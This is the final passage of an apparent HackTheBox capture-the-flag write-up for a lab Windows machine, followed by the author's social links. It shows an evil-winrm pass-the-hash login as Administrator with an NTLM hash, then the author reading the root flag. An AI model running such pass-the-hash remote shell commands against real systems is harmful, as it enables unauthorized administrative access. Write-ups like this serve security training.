elswix@parrot$ evil-winrm -i 10.10.11.202 -u 'Administrator' -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
a45c9*******************d0007b5
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```




### Thank you for reading:

+  [Instagram](https://www.instagram.com/elswix_/)
+  [YouTube](https://www.youtube.com/@ElSwix)
+  [Twitter](https://twitter.com/elswix_)
+  [HackTheBox](https://app.hackthebox.com/profile/935172)


#### My Blog: 

+ [WebHackology - Pentesting & Web Development](https://webhackology.vercel.app/)
